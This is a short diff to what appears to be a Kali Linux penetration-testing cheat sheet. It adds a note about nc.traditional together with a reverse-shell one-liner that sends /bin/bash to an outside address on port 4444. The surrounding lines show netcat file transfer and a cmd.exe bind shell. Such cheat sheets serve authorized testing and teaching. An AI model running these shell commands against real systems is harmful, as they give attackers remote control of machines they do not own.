@@ -145,6 +145,14 @@ Kali Linux
 
     -   Receive a file using netcat  
         `nc -nlvp 4444 > incoming.exe`
+        
+    -   Some OSs (OpenBSD) will use nc.traditional rather than nc so watch out for that...
+         
+            whereis nc
+            nc: /bin/nc.traditional /usr/share/man/man1/nc.1.gz
+
+            /bin/nc.traditional -e /bin/bash 1.2.3.4 4444
+
 
     -   Create a reverse shell with Ncat using cmd.exe on Windows  
         `nc.exe -nlvp 4444 -e cmd.exe`
